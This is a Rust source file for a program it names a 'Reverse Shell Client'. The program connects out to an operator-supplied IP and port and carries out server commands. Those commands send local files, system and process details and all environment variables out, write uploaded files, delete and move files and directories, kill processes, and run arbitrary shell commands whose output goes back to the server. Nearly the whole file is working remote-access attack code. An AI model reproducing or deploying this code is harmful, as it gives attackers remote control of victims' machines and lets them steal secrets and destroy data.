use std::net::*;
use std::io::*;
use std::process::{Command, Output};
use std::borrow::Cow;
use clap::{Arg, Command as ClapCommand};
use std::fs::File;
use std::path::Path;
use std::fs;
use std::io;
use sysinfo::{Components, Disks, Networks, Pid, System};
use std::thread;
use std::time::Duration;
use std::env;


/* Recursive function to move a directory. */
fn move_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {

    // https://medium.com/@akaivdo/rust-operating-files-and-folders-7ae4fc3cdad6
    if src.is_dir() {
        fs::create_dir_all(dst)?;
        for entry in src.read_dir()? {
            let entry = entry?;
            let src_path = entry.path();
            let dst_path = dst.join(entry.file_name());
            if src_path.is_dir() {
                move_dir_recursive(&src_path, &dst_path)?;
            } else {
                fs::rename(&src_path, &dst_path)?;
            }
        }
    } else {
        fs::rename(src, dst)?;
    }
    fs::remove_dir_all(src)?;
    Ok(())
}

/* Function to check if a file exists and return true or false. */
fn file_exists(path: &str) -> bool {

    // Check if the file exists.
    Path::new(path).exists()

}

fn executecommand(cmd: &String) -> String{

     // Declare variables for shell and argument.
     let (the_shell, the_arg);

     // Check the operating system and assign values.
     if std::env::consts::OS == "windows" {
     
         the_shell = "cmd";
         the_arg = "/c";
     
     } else {
     
         the_shell = "bash";
         the_arg = "-c";
     
     }
 
     // Run the command.
     let res: Output = Command::new(the_shell)
         .arg(the_arg)
         .arg(cmd)
         .output()
         .unwrap();
 
     // Get the output and error and convert to string.
     let stdout: Cow<str> = String::from_utf8_lossy(&res.stdout);
     let stderr: Cow<str> = String::from_utf8_lossy(&res.stderr);
 
     // Check which output to return.
     if stderr.is_empty() {
     
         stdout.to_string()
     
     } else {

         stderr.to_string()
     
     }

}

// Using Native Rust functions to perform tasks below: https://doc.rust-lang.org/rust-by-example/std_misc/fs.html
// 
// A simple implementation of `% cat path`.
fn cat(path: &Path) -> io::Result<String> {
    let mut f = File::open(path)?;
    let mut s = String::new();
    match f.read_to_string(&mut s) {
        Ok(_) => Ok(s),
        Err(e) => Err(e),
    }
}

/* Function to get system information. */
fn get_sys_info() -> Vec<String> {

    let mut sys = System::new_all();

    let mut output = Vec::new();

    // First we update all information of our `System` struct.
    sys.refresh_all();

    println!("=> system:");
    output.push ("=> system:".to_string());
    // RAM and swap information:
    //println!("total memory: {} bytes", sys.total_memory());
    output.push(format!("total memory: {} bytes", sys.total_memory()));
    println!("used memory : {} bytes", sys.used_memory());
    output.push(format!("used memory : {} bytes", sys.used_memory()));
    println!("total swap  : {} bytes", sys.total_swap());
    output.push(format!("total swap  : {} bytes", sys.total_swap()));
    println!("used swap   : {} bytes", sys.used_swap());
    output.push(format!("used swap   : {} bytes", sys.used_swap()));

    // Display system information:
    println!("System name:             {:?}", System::name());
    output.push(format!("System name:             {:?}", System::name()));
    println!("System kernel version:   {:?}", System::kernel_version());
    output.push(format!("System kernel version:   {:?}", System::kernel_version()));
    println!("System OS version:       {:?}", System::os_version());
    output.push(format!("System OS version:       {:?}", System::os_version()));
    println!("System host name:        {:?}", System::host_name());
    output.push(format!("System host name:        {:?}", System::host_name()));
    println!("System uptime:           {:?}", System::uptime());

    // Return the output.
    output

}

fn main() {

     // CLI arguments.
     let matches = ClapCommand::new("Reverse Shell Client")
        .version("0.11")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Client")
        
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("Remote server to connect to.")
                .required(true)
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Remote server port.")
                .required(true)
        )
        .arg(
            Arg::new("agent")
                .long("agent")
                .value_name("AGENT")
                .help("Agent Name")
                .required(true)
        )
        .get_matches();

        // Get IP address.
        let serverip = matches.get_one::<String>("IP").expect("IP address argument is required.");

        // Get port.
        let serverport: u16 = matches.get_one::<String>("port").expect("Port argument is required.").parse().expect("Port must be a valid number between 0 and 65535");

        // Converting IP address to Ipv4Addr.
        let _ip = match serverip.parse::<Ipv4Addr>() {
   
            Ok(ip) => ip,
            Err(e) => panic!("{}", e),
   
        };

        // Connect to the server.
        let mut tcpstream = match TcpStream::connect(format!("{}:{}",serverip,serverport)){
   
            Ok(s) => s,
            Err(e) => panic!("{}",e),
   
        };

        // Agent name.
        let agent = matches.get_one::<String>("agent").expect("Agent argument is required.").trim();

        // Message to send to server during initial connection. Maybe should add the OS after the agent.
        let msg = "".to_string() + agent + "\0";

        // Writing message to server.
        let _ = tcpstream.write(msg.as_bytes());

        // Receive data from server.
        let  _ = BufReader::new(&tcpstream);
    
        // Clone the stream for reading and writing.
        let tcpstream_read = tcpstream.try_clone().expect("Failed to clone stream for reading");
        let mut tcpstream_write = tcpstream.try_clone().expect("Failed to clone stream for writing");

        // Create a BufReader to read data from the server.
        let mut bufreader = BufReader::new(tcpstream_read);

        loop {

            // Read data from the server until the null terminator is reached.
            let mut receivingbuffer: Vec<u8> = Vec::new();
            let bytes_read = bufreader.read_until(b'\0', &mut receivingbuffer).unwrap();

            // If no more data from server, break the loop.
            // NOTE: Update the code to have the client continue to retry the connection
            // if the server is not available.    
            if bytes_read == 0 {
            
                println!("Server closed connection or no more commands.");
                break;
            
            }
            
            // Read the received data as a string.
            let full_line = String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0').trim().to_string();

            // Split the line into tokens.
            let tokens: Vec<&str> = full_line.split_whitespace().collect();
            if tokens.is_empty() {

                continue;
            
            }

            // First token is the command (download/exec/upload) used to determine what to do.
            let srv_cmd = tokens[0];
            let mut sys = System::new_all();

            match srv_cmd {

                "download" => {

                    // Debug.
                    println!("Downloading file to server.");

                    if tokens.len() < 2 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No filename provided for download.\0").unwrap();
                        continue;
            
                    }
            
                    let filename = tokens[1];

                    // Open the file and read its contents into a buffer.
                    let mut file = File::open(&filename).unwrap();
                
                    // Read the file contents into the buffer.
                    let mut file_buf = Vec::new();
                    file.read_to_end(&mut file_buf).unwrap();

                    // Send the file contents to the server.
                    tcpstream_write.write_all(&file_buf).unwrap();

                    // Flush the TCP stream to ensure the data is sent immediately.
                    tcpstream_write.flush().unwrap();

                    // Send a null-terminal character to the server to indicate the end of sending the file contents.
                    tcpstream_write.write_all(b"\0").unwrap();
                
                }

                "upload" => {

                    // Debug.
                    println!("Uploading file from server.");

                    if tokens.len() < 3 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No filename provided for upload.\0").unwrap();
                        continue;
            
                    }
                    let remote_file = tokens[1];
                    
                    // base64 decode the file contents.
                    let file_contents = base64::decode(tokens[3]).unwrap();
                    
                    // Write the file contents to a file on the client.
                    let mut file = File::create(&remote_file).unwrap();
                    file.write_all(&file_contents).unwrap();

                    // Send a null-terminal character to the server to indicate the end of sending the file contents.
                    tcpstream_write.write_all(b"\0").unwrap();

                    // Check if the file exists and send successful message or an error message.
                    if Path::new(&remote_file).exists() {
                    
                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"File uploaded successfully.\0").unwrap();
                    
                    } else {
                    
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: File upload failed.\0").unwrap();
                    }
                    
                }

                "rm" => {

                    // Debug.
                    println!("Removing file from server.");

                    // Check token length.

                    if tokens.len() < 2 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No filename provided for removal.\0").unwrap();
                        continue;
            
                    }


                    // Get the first token in the index and set to the filename.
                    let filename = tokens[1];

                    // Check if the file exists.
                    if !Path::exists(Path::new(filename)) {

                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"File doesn't exist.\0").unwrap();
                        continue;
                    
                    }

                    // Remove the file from the server.
                    fs::remove_file(filename).unwrap();
                       
                
                    // Check if the file exists.
                    if !Path::exists(Path::new(filename)) {

                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"File deleted.\0").unwrap();
                    
                    } else {

                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: File deletion failed.\0").unwrap();}

                }

                "rmdir" => {

                    // Debug.
                    println!("Removing directory from server.");

                    // Check token length.
                    if tokens.len() < 2 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No directory provided for removal.\0").unwrap();
                        continue;
            
                    }
                    
                    // Get the first token in the index and set to the directory.
                    let directory = tokens[1];

                    // Check if the directory exists.
                    if !Path::exists(Path::new(directory)) {

                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"Directory doesn't exist.\0").unwrap();
                        continue;
                    
                    }

                    // Remove the directory from the server.
                    fs::remove_dir_all(directory).unwrap();
                    tcpstream_write.write_all(b"Directory deleted.\0").unwrap();

                    // Check if the directory exists.
                    if Path::exists(Path::new(directory)) {

                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: Directory deletion failed.\0").unwrap();

                    } else {

                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"Directory deleted.\0").unwrap();
                        
                    }

                }

                "movefile" => {

                 
                    // Debug.
                    println!("Moving file or directory from server.");

                    // Check token length.
                    if tokens.len() < 3 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No source {}provided for moving.\0").unwrap();
                        continue;
            
                    }

                    // Get the first token in the index and set to the source.
                    let source = tokens[1];

                    // Get the second token in the index and set to the destination.
                    let destination = tokens[2];

                    // Check if the source file or directory exists.
                    if !Path::exists(Path::new(source)) {

                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: Source file doesn't exist.\0").unwrap();
                        continue;
                    
                    }
                    // Move the file or directory from the source to the destination.
                    fs::rename(source, destination).unwrap();

                    // check if the file or directory exists.
                    if !Path::exists(Path::new(source)) {

                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"File or directory moved.\0").unwrap();

                    } else {

                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: File or directory move failed.\0").unwrap();


                    }

                }

                "movedir" => {

                    // Debug.
                    println!("Moving directory from server.");

                    // Check token length.
                    if tokens.len() < 3 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No source directory provided for moving.\0").unwrap();
                        continue;
            
                    }    
                    // Get the first token in the index and set to the source.
                    let source = tokens[1];

                    // Get the second token in the index and set to the destination.
                    let destination = tokens[2];

                    // Check if the source directory exists.
                    if !Path::exists(Path::new(source)) {

                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: Source directory doesn't exist.\0").unwrap();
                        continue;
                        
                    }

                    // Move the directory from the source to the destination.
                                    
                    let src = Path::new(source);
                    let dst = Path::new(destination);
                    move_dir_recursive(src, dst).unwrap();
                    
                    // check if the directory exists.
                    if Path::exists(Path::new(destination)) {

                        // Send a successful message to the server.
                        tcpstream_write.write_all(b"Directory moved.\0").unwrap();

                    } else {

                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: Directory move failed.\0").unwrap();


                    }

                }
                
                "dir" => {

                    // Debug.
                    println!("Listing directory from server.");

                    // Check token length.
                    if tokens.len() < 2 {
            
                        // Send an error message to the server.
                        tcpstream_write.write_all(b"Error: No directory provided for listing.\0").unwrap();
                        continue;
            
                    }
                    // Get the first token in the index and set to the directory.
                    let directory = tokens[1];

                    // Read the contents of a directory and send it to the server.
                    match fs::read_dir(directory) {

                        Ok(entries) => {
                        
                            for entry in entries {

                                // Send the directory list to the server.
                                match entry {
                        
                                    Ok(path) => {
                        
                                        let filename = path.file_name().to_string_lossy().to_string();
                                        tcpstream_write.write_all(filename.as_bytes()).unwrap();
                                        tcpstream_write.write_all(b"\0").unwrap();
                        
                                    }
                        
                                    Err(e) => eprintln!("Error: {}", e),
                        
                                }
                        
                            }
                        
                        }
                        
                        Err(e) => eprintln!("Error: {}", e),
                    
                    }

                }

                "mkdir" => {

                        // Creates a directory and its subdirectories.

                        // Debug.
                        println!("Creating directory on host.");

                        // Check token length.
                        if tokens.len() < 2 {
            
                            // Send an error message to the server.
                            tcpstream_write.write_all(b"Error: No directory provided for creation.\0").unwrap();
                            continue;
            
                        }

                        let newdirectory = tokens[1];

                        // Recursively create a directory.
                        fs::create_dir_all(newdirectory).unwrap();


                        // Check if the directory exists and send a successful message or an error message.
                        if Path::new(newdirectory).exists() {

                            // Debug.
                            println!("Directory created successfully.");
                            // Send a successful message to the server.
                            tcpstream_write.write_all(b"Directory created successfully.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();


                        } else {    
                            
                            // Debug.
                            println!("Directory creation failed.");
                            // Send an error message to the server.
                            tcpstream_write.write_all(b"Error: Directory creation failed.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();

                        
                        }

                    }

                    "cat" => {

                        // Debug.
                        println!("cat a file and send file contents to the server.");

                        // Check token length.
                        if tokens.len() < 2 {
            
                            // Send an error message to the server.
                            tcpstream_write.write_all(b"Error: No filename provided for cat.\0").unwrap();
                            continue;
            
                        }
                        let filename = tokens[1];

                        match cat(&Path::new(&filename)) {
                            
                            // Send the file contents to the server.
                            Ok(contents) => {
                                tcpstream_write.write_all(contents.as_bytes()).unwrap();
                                tcpstream_write.write_all(b"\0").unwrap();
                            
                            }

                            Err(s) => eprintln!("Error: {}", s),
                        }
                    }

                    "sysbasic" => {

                        // Debug.
                        println!("Sending basic system information to server.");

                        // Send system information.
                        let output = get_sys_info();
                        for line in output {

                            tcpstream_write.write_all(line.as_bytes()).unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();
                        
                        }
                    
                    }

                    "env" => {

                        // Debug.
                        println!("Sending environment variables to server.");

                        // Set a string vector.
                        let output = env::vars().collect::<Vec<(String, String)>>();


                        // Send environment variables.
                       tcpstream_write.write_all(format!("{:?}", output).as_bytes()).unwrap();
                        tcpstream_write.write_all(b"\0").unwrap();
                        
                     }
                    
                    "sysdetails" => {

                        // Debug.
                        println!("Sending detailed system information to server.");

                        // Please note that we use "new_all" to ensure that all lists of
                        // CPUs and processes are filled!
                        // https://docs.rs/sysinfo/latest/sysinfo/

                        // let mut output = Vec::new();

                        // First we update all information of our `System` struct.
                        sys.refresh_all();

                        let mut output = get_sys_info();

                        // Number of CPUs:
                        println!("NB CPUs: {}", sys.cpus().len());
                        output.push(format!("NB CPUs: {}", sys.cpus().len()));

                        // Display processes ID, name na disk usage:
                        for (pid, process) in sys.processes() {
                            println!("[{pid}] {:?} {:?} {:?} {:?}", process.name(), process.cmd(), process.environ(), process.exe());
                            output.push(format!("[{pid}] {:?} {:?} {:?} {:?}", process.name(), process.cmd(), process.environ(), process.exe()));
                        }

                        // We display all disks' information:
                        println!("=> disks:");
                        output.push("=> disks:".to_string());
                        let disks = Disks::new_with_refreshed_list();
                        for disk in &disks {
                            println!("{disk:?}");
                            output.push(format!("{disk:?}"));
                        }

                        // Network interfaces name, total data received and total data transmitted:
                        let networks = Networks::new_with_refreshed_list();
                        println!("=> networks:");
                        for (interface_name, data) in &networks {
                            println!(
                                "{interface_name}: {} B (down) / {} B (up)",
                                data.total_received(),
                                data.total_transmitted(),
                            );
                            output.push(format!("{interface_name}: {} B (down) / {} B (up)", data.total_received(), data.total_transmitted()));
                            // If you want the amount of data received/transmitted since last call
                            // to `Networks::refresh`, use `received`/`transmitted`.
                        }

                        // Components temperature:
                        let components = Components::new_with_refreshed_list();
                        println!("=> components:");
                        for component in &components {

                            println!("{component:?}");
                            output.push(format!("{component:?}"));
                        
                        }

                        // Convert the output to a string with each line separated by a newline.
                        let output = output.join("\n");

                        // write output to server.
                        tcpstream_write.write_all(output.as_bytes()).unwrap();
                        tcpstream_write.write_all(b"\0").unwrap();
                        
                    }

                    "proc" => {

                        // Debug.
                        println!("Sending list of processes to server.");

                        let mut output = Vec::new();

                        // Display processes ID, name disk usage:
                        for (pid, process) in sys.processes() {
                           // println!("[{pid}] {:?} {:?}", process.name(), process.cmd());

                           // If the process path is null then skip it.
                           if process.cmd().is_empty() {

                               continue;
                           
                           }

                            let p_path =  process.cmd().get(0).unwrap();

                            // Convert the p_path to a string.
                            let p_path = p_path.to_string_lossy().to_string();

                            // Split the output into a vector of strings.
                            let p_tmp = p_path.split(' ').collect::<Vec<&str>>();
                            let p_tmppath = p_tmp[0];


                            output.push(format!("[{pid}] {:?} {}", process.name(),p_tmppath));

                        }

                        // Send the list of processes to the server.
                        let output = output.join("\n");
                        tcpstream_write.write_all(output.as_bytes()).unwrap();
                        tcpstream_write.write_all(b"\0").unwrap();
                    
                    }

                    "kproc" => {

                        // Debug.
                        println!("Kills a process.");

                        // If there is no second token, send an error message to the server.
                        if tokens.len() < 2 {

                            tcpstream_write.write_all(b"Error: No process ID provided.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();

                            continue;
                        
                        }
                        
                        // If the token is not an integer, send an error message to the server.
                        if !tokens[1].parse::<usize>().is_ok() {
                        
                            tcpstream_write.write_all(b"Error: Invalid process ID.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();
                            continue;
                        
                        }

                        // Get the process as the second token as an integer.
                        let the_pid = tokens[1].parse::<usize>().unwrap();

                        if let Some(process) = sys.process(Pid::from(the_pid.clone())) {

                            process.kill();
                        
                        }

                        // Sleep for 5 seconds.
                        thread::sleep(Duration::from_secs(5));

                        // Refresh the system information.
                        let proc = System::new_all();

                        // Get the list of processes.
                        let mut pid_vec = Vec::new();
                        for (pid, _process) in proc.processes() {
                        
                            pid_vec.push(pid.as_u32() as usize);
                        
                        }

                        // Check if the_pid is in the list of processes.
                        if pid_vec.contains(&the_pid) {

                            tcpstream_write.write_all(b"Process was not killed.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();
                    
                        } else {
                        
                            tcpstream_write.write_all(b"Process killed.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();
                        
                        }

                    }

                    "pwd" => {


                        // Debug.
                        println!("Sending current directory to server.");

                        // Get the current directory.
                        let current_dir = env::current_dir().unwrap();

                        // Convert the current directory to a string.
                        let current_dir = current_dir.to_string_lossy().to_string();

                        // Send the current directory to the server.
                        tcpstream_write.write_all(current_dir.as_bytes()).unwrap();
                        tcpstream_write.write_all(b"\0").unwrap();
                    
                    }

                    "setcwd" => {

                        // Debug.
                        println!("Setting current directory.");

                        // If there is no second token, send an error message to the server.
                        if tokens.len() < 2 {

                            tcpstream_write.write_all(b"Error: No directory provided.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();

                            continue;

                        }

                        // Directory is the second token.
                        let directory = tokens[1];

                        // Check if the directory exists.
                        if Path::new(directory).exists() {

                            let root = Path::new(directory);
                            assert!(env::set_current_dir(&root).is_ok());

                            // Send success message to the server.
                            tcpstream_write.write_all(b"Successfully changed working directory.").unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();

                        } else {

                            let dir_error = format!("Error: Directory {} does not exist.", directory);
                            // Send error message to the server.
                            tcpstream_write.write_all(dir_error.as_bytes()).unwrap();
                            tcpstream_write.write_all(b"\0").unwrap();

                        }

                    }

                    "exec" => {

                        // Debug.
                        println!("Executing command from server.");

                        if tokens.len() < 2 {
                        
                            println!("No command provided after 'exec'.");
                            continue;
                        
                        }

                        // Join the remaining tokens into a single string which is the command to execute.
                        let command_to_run = tokens[1..].join(" ");

                        // Execute the command and send the output to the server.
                        let mut output = executecommand(&command_to_run);
                        
                        // Send a null-terminal character to the server to indicate the end of sending the command output.
                        output.push('\0');
                        tcpstream_write.write_all(output.as_bytes()).unwrap();

                    }

                _ => {

                    println!("Unknown command from server.");
                
                }
            
            }

        }

}
